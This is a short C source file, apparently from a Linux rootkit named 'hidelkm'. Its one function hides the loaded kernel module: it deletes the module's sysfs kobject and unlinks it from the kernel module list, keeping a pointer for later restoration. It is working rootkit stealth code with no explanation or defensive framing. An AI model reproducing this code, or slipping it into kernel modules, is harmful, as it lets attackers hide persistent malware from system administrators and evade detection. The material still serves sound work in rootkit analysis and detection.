#include "hidelkm.h"

struct list_head *prev_module;

void hidelkm_init(void)
{
	if (THIS_MODULE->mkobj.kobj.state_initialized) {
		kobject_del(&THIS_MODULE->mkobj.kobj);
	}

	prev_module = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);

	return;
}